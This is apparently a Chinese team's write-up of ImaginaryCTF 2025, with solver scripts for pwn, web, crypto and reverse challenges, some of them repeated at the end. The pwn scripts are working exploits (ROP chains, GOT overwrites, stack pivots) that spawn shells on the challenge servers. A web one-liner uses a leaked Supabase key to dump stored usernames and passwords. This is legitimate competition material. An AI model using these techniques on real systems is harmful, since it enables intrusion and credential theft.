# ImaginaryCTF 2025 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/269585.html
> ID: 269585

Pwn

babybof

from pwn import *
context.log_level="debug"

p = ELF("./vuln")

libc   = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/libc.so.6")
ld     = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/ld-linux-x86-64.so.2")
#p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
p=remote("babybof.chal.imaginaryctf.org", 1337)
p.recvuntil("system @ ")
system_addr_str = p.readline().strip()  
system_addr = int(system_addr_str, 16) 

p.recvuntil("rdi; ret @ ")
pop_rdi_ret_str = p.readline().strip()
pop_rdi_ret = int(pop_rdi_ret_str, 16)

p.recvuntil("ret @ ")
ret_str = p.readline().strip()
ret = int(ret_str, 16)

p.recvuntil('"/bin/sh" @ ')  
binsh_str = p.readline().strip()
binsh = int(binsh_str, 16)

p.recvuntil("canary: ")
canary_str = p.readline().strip()
canary = int(canary_str, 16)

print(f"system: 0x{system_addr:x}")
print(f"pop rdi; ret: 0x{pop_rdi_ret:x}")
print(f"ret: 0x{ret:x}")
print(f"/bin/sh: 0x{binsh:x}")
print(f"canary: 0x{canary:x}")

log.success("the system addr:"+hex(system_addr))
log.success("pop rdi ret addr:"+hex(pop_rdi_ret))
log.success("ret addr:"+hex(ret))
log.success("binsh addr:"+hex(binsh))
log.success("canary addr:"+hex(canary))

payload=b"A"*0x38+p64(canary)+p64(pop_rdi_ret)+p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system_addr)
p.sendline(payload)
p.interactive()

ictf{arent_challenges_written_two_hours_before_ctf_amazing}

addition

from pwn import *
context.log_level="debug"

p = ELF("./vuln")

libc   = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/libc.so.6")
ld     = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/ld-linux-x86-64.so.2")
#p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
p=remote("addition.chal.imaginaryctf.org", 1337)
atoll_offset=libc.symbols['atoll']
system_offset=libc.symbols['system']
got_offset=0x4020-0x4069
patch_value=system_offset-atoll_offset
print(patch_value)

p.recvuntil("add where? ")
p.sendline(str(got_offset))
p.recvuntil("add what? ")
p.sendline(str(patch_value))

p.recvuntil("add where? ")
p.sendline("/bin/sh")
p.interactive()

ictf{i_love_finding_offsets_4fd29170cb90}

cascade

用到如下两个magic gadget来构造出one_gadget，然后再劫持rip到我们构造的one_gadget的地方即可，需要多次栈迁移。

from pwn import *
#p=process("./vuln")
p=remote("cascade.chal.imaginaryctf.org",1337)
elf=ELF("./vuln")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
payload1=b'a'*0x40+p64(0x404600)+p64(0x401162)
p.send(payload1)
pause()
payload2=b'a'*0x48+p64(0x401074)
p.send(payload2)
pause()
offset=0xc52a0-0x201+1+0xc0

payload3=b'a'*0x40+p64(0x404950)+p64(0x40112C)+p64(0x4049d8-0x40)+p64(0x401088)+b'a'*0x30+p64(offset)*8
payload4=b'a'*0x38+p64(0x404940)*2+p64(0x401162)
p.send(payload4)
pause()
p.send(payload3)
pause()

payload5=b'a'*0x38+p64(0x40493d-8)*2+p64(0x401162)
payload6=b'x00'*0x38+p64(0x404858+0x3d)*2+p64(0x401137)+p64(0x40116E)

p.send(payload5)
pause()

p.send(payload6)
pause()

payload7=b'x00'*0x48+p64(0)+p64(0x4011C9)+p64(0x404890+0x20)+p64(0x40115E)
#gdb.attach(p)
p.send(payload7)
pause()
p.send(b'x00'*0x48+p64(0x4011C9)+p64(0x404850)+p64(0x401179))
pause()
p.interactive() 

twowrite

不知道为什么修改___stack_chk_fail的got表指向gets，修改canary环境变量，程序执行___stack_chk_fail，之后再ret2libc即可

from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.binary = elf = ELF("./vuln")

libc = ELF("/home/who4mi/ctf/challenge/imaginaryctf/twowrite/challenge/libc.so.6")
# ld= ELF("/home/who4mi/ctf/challenge/imaginaryctf/twowrite/challenge/ld-linux-x86-64.so.2")
# p = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
p=remote("twowrite.chal.imaginaryctf.org",1337)

p.recvuntil("system @ ")
system_addr = int(p.readline().strip(), 16)
libc_base = system_addr - libc.sym['system']
info(f"libc base: 0x{libc_base:x}")
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
info(f"/bin/sh address: 0x{bin_sh_addr:x}")
xor_secrt=libc_base-0x2898
info(f"tls dtor list: 0x{xor_secrt:x}")
#0x0000000000119fdc : pop rdi ; ret
pop_rdi_ret=libc_base+0x000000000002a3e5
gets_addr=libc_base+libc.sym['gets']
info(f"one_gadget: 0x{gets_addr:x}")

p.recvuntil("what? ")
p.sendline(str(gets_addr))  
p.recvuntil("what? ")
p.sendline(str(bin_sh_addr))  

p.recvuntil("where? ")
p.sendline(hex(0x404000))  
p.recvuntil("where? ")
p.sendline(hex(xor_secrt))  
payload=b"A"*0x4f8+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)
#payload=b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaan"
p.sendline(payload)
p.interactive()

Web

imaginary-notes

js有anon key和Supabase UR，直接查询users表

(async()=>{const{createClient}=await import("https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm");const s=createClient("https://dpyxnwiuwzahkxuxrojp.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");console.log(await s.from("users").select("username,password"));})();

certificate

(()=>{
const svg = buildCertificateSVG({
    participant: "Eth007",
    affiliation: (typeof affInput !== 'undefined' ? affInput.value.trim() : "Participant") || "Participant",
    date: (typeof dateInput !== 'undefined' ? dateInput.value : newDate().toLocaleDateString()),
    styleKey: (typeof styleSelect !== 'undefined' ? styleSelect.value : "default")
  });
if (typeof svgHolder !== 'undefined') {
    svgHolder.innerHTML = svg;
    svgHolder.dataset.currentSvg = svg;
  }
const blob = new Blob([svg], {type: "image/svg+xml;charset=utf-8"});
const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = "eth007_imaginaryctf2025.svg";
document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(()=>URL.revokeObjectURL(a.href), 1000);
})();

Crypto

redacted

from itertools import cycle

ct_hex = (
    "65 6c ce 6b c1 75 61 7e 53 66 c9 52 d8 6c 6a 53 "
    "6e 6e de 52 df 63 6d 7e 75 7f ce 64 d5 63 73"
)
ciphertext = bytes.fromhex(ct_hex)

key = bytes.fromhex("0c0fba0dba0d0e0c")

plaintext = bytes([c ^ k for c, k in zip(ciphertext, cycle(key))])

print("Ciphertext:", ciphertext.hex())
print("Key:", key.hex())
print("Plaintext:", plaintext.decode())
# Plaintext: ictf{xor_is_bad_bad_encryption}

leaky-rsa

题目最后直接把key_m输出了，可以写个交互随便传1024组把最后输出的key_m接收到，然后那这些数据解一个aes即可获得flag

from pwn import *
from tqdm import *
import json
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import sha256
# io=remote("leaky-rsa.chal.imaginaryctf.org",1337)
# print(io.recv())
# print(io.recv())
# for i in trange(1025):
#     #print(io.recv())
#     io.sendline(b'{"c": 1}')
#     if(i>1000):
#         print(print(i,io.recv()))
#     else:
#         io.recv()
m=64416475091716761692127065389812664612883821582591868994255743494545506675773735408721803166930029973983156578906465037477870062272357725192966823066525475496908898190713767869944430829242616317686333351677545740313689764845810633864336858299105462505138965533921130056219286941873561437748203263071361226008
n=123523209115700070294981644790732507503241942394429660136286979085225539225766918094934084003208926365019794286807900970816082816805556312818180615326649781915503786367730476966518584795526802784277073173160764347448395548851236780509226531914660480359338947359987945086356147300832747042633158994277007963171
c=120556973610037647045631630603117690400204857398547796880632998178170164895802830966746983439988532372658807195415563963889101999001415501102869032382253975872835427817309277074087228787460070474098302761376812778112225868877978964444703058764270898908786813264849059600935509586945017063271188912710680388201
iv=0xb17c27e8915a32ed257f093a293f39ab
ct=0x0639466fc8d94dd2b3b5737f62148951c2c480cda262d2cf3465ab7bbd68381bff592878e9825f380d48743b2362d43f0d13bc679a1447c80c49f8dee09e3ff63b48ff423ac2d7c57fe930a75be69e71
key = sha256(str(m).encode()).digest()[:16]
aes=AES.new(key, AES.MODE_CBC, IV=long_to_bytes(iv))
print(aes.decrypt(long_to_bytes(ct)))
#ictf{p13cin9_7h3_b1t5_t0g37her_3f0068c1b9be2547ada52a8020420fb0}

Reverse

comparing

outputs = [
"9548128459","491095","1014813","561097","10211614611201","5748108475",
"1171123","516484615","114959","649969946","1051160611501","991021",
"1231012101321","9912515","11411511","1151164611511"
]

def try_even_ascii(s):
    for ii in range(100):
        ii_str = str(ii)
        for l1 in range(1,4):
            for l2 in range(1,4):
                v1v3_len = l1 + l2
                if len(s) < v1v3_len + len(ii_str): continue
                v1v3 = s[:v1v3_len]; rest = s[v1v3_len:]
                ifnot rest.startswith(ii_str): continue
                tail = rest[len(ii_str):]
                if tail == v1v3[::-1]:
                    v1 = int(v1v3[:l1]); v3 = int(v1v3[l1:])
                    if32 <= v1 <= 126and32 <= v3 <= 126:
                        return ('even', v1, v3, ii)
    returnNone

def try_odd_ascii(s):
    for ii in range(100):
        ii_str = str(ii)
        ifnot s.endswith(ii_str): continue
        body = s[:-len(ii_str)]
        for l1 in range(1,4):
            if l1 >= len(body): break
            v1 = int(body[:l1]); v3 = int(body[l1:])
            if32 <= v1 <= 126and32 <= v3 <= 126:
                return ('odd', v1, v3, ii)
    returnNone

# 解析每一行（保持原顺序）
parsed = []
for o in outputs:
    r = try_even_ascii(o)
    if r isNone:
        r = try_odd_ascii(o)
    if r isNone:
        raise ValueError("无法解析输出行: " + o)
    parsed.append(r)

# 按两行一组恢复两个 tuple：A=(v1,v3,i1) 和 B=(v2,v4,i2)
tuples = {}
for p in range(len(parsed)//2):
    A = parsed[2*p]; B = parsed[2*p+1]
    _, a_x, a_y, i1 = A
    _, b_x, b_y, i2 = B
    tuples[i1] = (a_x, b_x)
    tuples[i2] = (a_y, b_y)

# 按索引 0..max 输出最终 flag
max_index = max(tuples.keys())
flag = "".join(chr(a)+chr(b) for i,(a,b) in sorted(tuples.items(), key=lambda x:x[0]))
print(flag)

ictf{cu3st0m_c0mp@r@t0rs_1e8f9e}

nimord

enc = bytes([
    0x28,0xF8,0x3E,0xE6,0x3E,0x2F,0x43,0x0C,
    0xB9,0x96,0xD1,0x5C,0xD6,0xBF,0x36,0xD8,
    0x20,0x79,0x0E,0x8E,0x52,0x21,0xB2,0x50,
    0xE3,0x98,0xB5,0xC9,0xB8,0xA0,0x88,0x30,
    0xD9,0x0A
])

seed = 322376503# main 中的参数

def keystream(seed, length):
    """模拟 keystream__nimrod_20"""
    n = seed
    ks = bytearray()
    for _ in range(length):
        n = (1664525 * n + 1013904223) & 0xFFFFFFFF# 32位溢出
        ks.append((n >> 16) & 0xFF)  # BYTE2
    return ks

def xor_decrypt(enc, seed):
    ks = keystream(seed, len(enc))
    return bytes([c ^ k for c, k in zip(enc, ks)])

plain = xor_decrypt(enc, seed)

# 打印可读明文
print("Decrypted:", ''.join(chr(x) if32 <= x <= 126else'.'for x in plain))

ictf{a_mighty_hunter_bfc16cce9dc8}

werid

def reverseTransformFlag(transformed_flag):

    char_sets = [
        ("abcdefghijklmnopqrstuvwxyz", 26, lambda i, pos: (pos - i) % 26),
        ("0123456789", 10, lambda i, pos: next(c for c in range(10) if (i*2 + c) % 10 == pos)),
        ("!@#$%^&*()_+{}[]|", 17, lambda i, pos: next(c for c in range(17) if (i*i + c) % 17 == pos))
    ]
    
    result = []
    for i, char in enumerate(transformed_flag):
        for set_str, modulus, reverse_func in char_sets:
            if char in set_str:
                pos = set_str.index(char)
                try:
                    orig_pos = reverse_func(i, pos)
                    result.append(set_str[orig_pos])
                    break
                except StopIteration:
                    result.append(set_str[0])
        else:
            result.append(char)
    return''.join(result)

if __name__ == "__main__":
    transformed_string = "idvi+1{s6e3{)arg2zv[moqa905+"
    original_string = reverseTransformFlag(transformed_string)
    print(f"Transformed flag: {transformed_string}")
    print(f"Original flag: {original_string}")

ictf{1_l0v3_@ndr0id_stud103}

stacked

def reverse_off(x):

    return x - 15

def reverse_eor(x):

    return x ^ 0x69

def reverse_rtr(x):

    return ((x << 1) & 0xff) | (x >> 7)

def reverse_inc_output_to_input(next_flag):

    return next_flag
datas='94 7 d4 64 7 54 63 24 ad 98 45 72 35'
data1=0x94
data1=reverse_rtr(data1)
data1=reverse_eor(data1)
data1=reverse_off(data1)
print(chr(data1),end='')

data2=0x7
data2=reverse_eor(data2)
data2=reverse_eor(data2)
data2=reverse_eor(data2)
print(chr(data2),end='')

data2=0xd4
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x64
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x7
data2=reverse_eor(data2)
data2=reverse_eor(data2)
data2=reverse_eor(data2)
print(chr(data2),end='')

data2=0x54
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x63
data2=reverse_rtr(data2)
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x24
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0xad
data2=reverse_eor(data2)
data2=reverse_off(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x98
data2=reverse_rtr(data2)
data2=reverse_eor(data2)
data2=reverse_eor(data2)
print(chr(data2),end='')

data2=0x45
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_off(data2)
print(chr(data2),end='')

data2=0x72
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x35
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_eor(data2)
print(chr(data2))

icft{1n54n3_5k1ll2}

questionably

四个进程合作计算的结果：
35 0F EC D2 90 4E 8D 54 43 61 C2 EC 39 B1 58 D4 D6 CF 5D 94 E5 F5 D5 0C 85 E4 92 67 5A 31 47 51 07 67 D2 4E E4 0E D5 5B 9E 46 FE 83 23 09 0E A8 88 97 EF 9C 3B 74 DC EF 0B 21 6E 94 99 84 94 CF 22 19 51 BA 53 D5 C4 A0 C7 F5 5A 21 2D 94 78 E4 E2 9E 34 CC C5 C3 F2 67 13 2B 47 5B E3 12 E1 B4 D7 E1 A1 E1 66 94 30 5C 38 3E 2C 99 85 D7 2C 96 24 93 95 1D 6C 36 CB 4F 95 49 61 27 07 F2 12 15 82 5F A5 13 AA 84 26 16 F5 05 5E A9 8B 3D EE E3 80 33 AF BC 94 B1 BF D8 2A 4F B6 60 F0 73 24 A6 89 78 68 5F 2F 42 24 54 76 35 AC 35 A1 4E 5F 50 AB AD C0 F6 0D B6 81 66 B4 66 79 D8 8D 4C 31 45 F7 48 D3 5E BD AE 65 5F 12 C0 43 34 41 41 66 1C 1D 59 C5 59 BE 76 6B A6 87 13 31 43 93 91 B8 41 88 42 4E 79 1C E2 87 E1 50 01 EF C6 71 09 15 3D 91 8A 45 FB 2B DF D0 E9 AA B0 5C EC F0 C7 5C AB 38 DE 53 07 6B 50 18 F0 C1 BE EA 61 F6 AE 4D 33 63 C2 65 45 D0 E4 5E 2D 47 6D C8 6E 63 58 C8 D2 E9 4F 5F 03 0F D4 27 80 45 C0 10 67 A1 91 D1 B4 02 E5 28 85 78 39 E2 F6 D5 DD 8F E7 E4 0E 6D 6D 0C 29 B3 4F AC 11 86 20 80 49 3E 50 89 BE B7 BA D2 13 6B FD FB FC 22 80 88 60 9E A0 75 BA 4F E1 12 B9 DF 71 79 94 45 28 11 B2 2C 49 9C 1A 2F 21 DC D1 CE 8B 7C 1B 42 37 2F 6C 8E 80 79 11 90 3A 79 23 D7 22 6E CB FD 2E AC 58 A3 FB 26 89 CC B5 09 CD 6F B4 17 E0 37 FD 9F DC AC C7 9C F0 30 C4 CA BE 19 63 B8 C6 45 98 51 17 4A 26 CF 49 87 87 45 2D 72 31 C1 3F 38 8F 52 18 0D A1 BB 6C 99 B4 5E 61 CE C9 56 42 90 53 08 8E 28 8E 06 E6 44 77 70 E9 BA AF 58 25 F5 5D EC 31 AE DE 4C F6 45 DD 06 3F D6 08 B0 19 92 EC D6 6D AD 88 FF 6C 36 F5 BD 1B D3 C4 EF 77 55 0F D7 B2 9C 5A D3 15 E3 88 03 68 C3 EA 30 04 89 BA A5 66 33 D3 3A DA 77 26 A4 01 1E 4A A7 22 08 35 7F D8 3E 09 9C 50 C0 D6 6B B7 6B CF F2 24 38 5F 3D DC C8 A6 69 76 77 BC A6 44 39 FC 99 75 60 C7 FC D2 FF 4B D5 F3 50 F0 E1 72 76 82 35 E1 F4 B5 6C EF 0A 84 99 B5 73 EE 28 DB 1E 75 FF 31 6B 32 B2 A2 AC 33 44 AF 5A 54 55 33 89 4D 0B AC 32 AE CF 67 65 17 CB 87 B4 27 99 85 4B 48 E6 ED AD 43 3E 0D AD B5 EB B6 72 EF 60 75 6C A2 50 D1 FB D6 E7 8F 9C EA CD 04 C0 96 B8 42 11 D1 5E 6D C4 48 A9 A0 2C 76 0A 18 6A 9D 3C 89 EB 3F 09 1D C9 20 5C 94 BD 58 4B AC A1 37 21 61 B7 2E 7E B2 A9 56 31 89 4D 3B D0 E3 87 BF 9B A9 35 D4 76 2D A7 85 75 93 8C EF F6 61 5D C6 71 C4 1F 1E A9 63 20 DE 30 9C C8 B3 36 83 A9 85 5B 8D 08 80 EA E6 34 0E 28 F4 2C 51 04 3D C6 A4 30 14 33 88 3F 49 9A A6 14 95 08 FE C7 E0 B2 5A A1 ED 8D 3A 82 F5 73 DD 18 D6 DD 4F C2 D2 AA 35 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51

Misc

significant

FORENSICS

选择目标NTUSER.DAT文件，加载临时项，浏览子键，重点查找vnc

FORENSICS

随波逐流一把梭

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *
context.log_level="debug"

p = ELF("./vuln")

libc   = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/libc.so.6")
ld     = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/ld-linux-x86-64.so.2")
#p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
p=remote("babybof.chal.imaginaryctf.org", 1337)
p.recvuntil("system @ ")
system_addr_str = p.readline().strip()  
system_addr = int(system_addr_str, 16) 

p.recvuntil("rdi; ret @ ")
pop_rdi_ret_str = p.readline().strip()
pop_rdi_ret = int(pop_rdi_ret_str, 16)

p.recvuntil("ret @ ")
ret_str = p.readline().strip()
ret = int(ret_str, 16)

p.recvuntil('"/bin/sh" @ ')  
binsh_str = p.readline().strip()
binsh = int(binsh_str, 16)

p.recvuntil("canary: ")
canary_str = p.readline().strip()
canary = int(canary_str, 16)

print(f"system: 0x{system_addr:x}")
print(f"pop rdi; ret: 0x{pop_rdi_ret:x}")
print(f"ret: 0x{ret:x}")
print(f"/bin/sh: 0x{binsh:x}")
print(f"canary: 0x{canary:x}")

log.success("the system addr:"+hex(system_addr))
log.success("pop rdi ret addr:"+hex(pop_rdi_ret))
log.success("ret addr:"+hex(ret))
log.success("binsh addr:"+hex(binsh))
log.success("canary addr:"+hex(canary))

payload=b"A"*0x38+p64(canary)+p64(pop_rdi_ret)+p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system_addr)
p.sendline(payload)
p.interactive()
```



```
from pwn import *
context.log_level="debug"

p = ELF("./vuln")

libc   = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/libc.so.6")
ld     = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/ld-linux-x86-64.so.2")
#p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
p=remote("addition.chal.imaginaryctf.org", 1337)
atoll_offset=libc.symbols['atoll']
system_offset=libc.symbols['system']
got_offset=0x4020-0x4069
patch_value=system_offset-atoll_offset
print(patch_value)

p.recvuntil("add where? ")
p.sendline(str(got_offset))
p.recvuntil("add what? ")
p.sendline(str(patch_value))

p.recvuntil("add where? ")
p.sendline("/bin/sh")
p.interactive()
```



```
from pwn import *
#p=process("./vuln")
p=remote("cascade.chal.imaginaryctf.org",1337)
elf=ELF("./vuln")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
payload1=b'a'*0x40+p64(0x404600)+p64(0x401162)
p.send(payload1)
pause()
payload2=b'a'*0x48+p64(0x401074)
p.send(payload2)
pause()
offset=0xc52a0-0x201+1+0xc0

payload3=b'a'*0x40+p64(0x404950)+p64(0x40112C)+p64(0x4049d8-0x40)+p64(0x401088)+b'a'*0x30+p64(offset)*8
payload4=b'a'*0x38+p64(0x404940)*2+p64(0x401162)
p.send(payload4)
pause()
p.send(payload3)
pause()

payload5=b'a'*0x38+p64(0x40493d-8)*2+p64(0x401162)
payload6=b'x00'*0x38+p64(0x404858+0x3d)*2+p64(0x401137)+p64(0x40116E)

p.send(payload5)
pause()

p.send(payload6)
pause()

payload7=b'x00'*0x48+p64(0)+p64(0x4011C9)+p64(0x404890+0x20)+p64(0x40115E)
#gdb.attach(p)
p.send(payload7)
pause()
p.send(b'x00'*0x48+p64(0x4011C9)+p64(0x404850)+p64(0x401179))
pause()
p.interactive()
```



```
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.binary = elf = ELF("./vuln")

libc = ELF("/home/who4mi/ctf/challenge/imaginaryctf/twowrite/challenge/libc.so.6")
# ld= ELF("/home/who4mi/ctf/challenge/imaginaryctf/twowrite/challenge/ld-linux-x86-64.so.2")
# p = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
p=remote("twowrite.chal.imaginaryctf.org",1337)

p.recvuntil("system @ ")
system_addr = int(p.readline().strip(), 16)
libc_base = system_addr - libc.sym['system']
info(f"libc base: 0x{libc_base:x}")
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
info(f"/bin/sh address: 0x{bin_sh_addr:x}")
xor_secrt=libc_base-0x2898
info(f"tls dtor list: 0x{xor_secrt:x}")
#0x0000000000119fdc : pop rdi ; ret
pop_rdi_ret=libc_base+0x000000000002a3e5
gets_addr=libc_base+libc.sym['gets']
info(f"one_gadget: 0x{gets_addr:x}")

p.recvuntil("what? ")
p.sendline(str(gets_addr))  
p.recvuntil("what? ")
p.sendline(str(bin_sh_addr))  

p.recvuntil("where? ")
p.sendline(hex(0x404000))  
p.recvuntil("where? ")
p.sendline(hex(xor_secrt))  
payload=b"A"*0x4f8+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)
#payload=b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaan"
p.sendline(payload)
p.interactive()
```



```
(async()=>{const{createClient}=await import("https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm");const s=createClient("https://dpyxnwiuwzahkxuxrojp.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");console.log(await s.from("users").select("username,password"));})();
```



```
(()=>{
const svg = buildCertificateSVG({
    participant: "Eth007",
    affiliation: (typeof affInput !== 'undefined' ? affInput.value.trim() : "Participant") || "Participant",
    date: (typeof dateInput !== 'undefined' ? dateInput.value : newDate().toLocaleDateString()),
    styleKey: (typeof styleSelect !== 'undefined' ? styleSelect.value : "default")
  });
if (typeof svgHolder !== 'undefined') {
    svgHolder.innerHTML = svg;
    svgHolder.dataset.currentSvg = svg;
  }
const blob = new Blob([svg], {type: "image/svg+xml;charset=utf-8"});
const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = "eth007_imaginaryctf2025.svg";
document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(()=>URL.revokeObjectURL(a.href), 1000);
})();
```



```
from itertools import cycle

ct_hex = (
    "65 6c ce 6b c1 75 61 7e 53 66 c9 52 d8 6c 6a 53 "
    "6e 6e de 52 df 63 6d 7e 75 7f ce 64 d5 63 73"
)
ciphertext = bytes.fromhex(ct_hex)

key = bytes.fromhex("0c0fba0dba0d0e0c")

plaintext = bytes([c ^ k for c, k in zip(ciphertext, cycle(key))])

print("Ciphertext:", ciphertext.hex())
print("Key:", key.hex())
print("Plaintext:", plaintext.decode())
# Plaintext: ictf{xor_is_bad_bad_encryption}
```



```
from pwn import *
from tqdm import *
import json
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import sha256
# io=remote("leaky-rsa.chal.imaginaryctf.org",1337)
# print(io.recv())
# print(io.recv())
# for i in trange(1025):
#     #print(io.recv())
#     io.sendline(b'{"c": 1}')
#     if(i>1000):
#         print(print(i,io.recv()))
#     else:
#         io.recv()
m=64416475091716761692127065389812664612883821582591868994255743494545506675773735408721803166930029973983156578906465037477870062272357725192966823066525475496908898190713767869944430829242616317686333351677545740313689764845810633864336858299105462505138965533921130056219286941873561437748203263071361226008
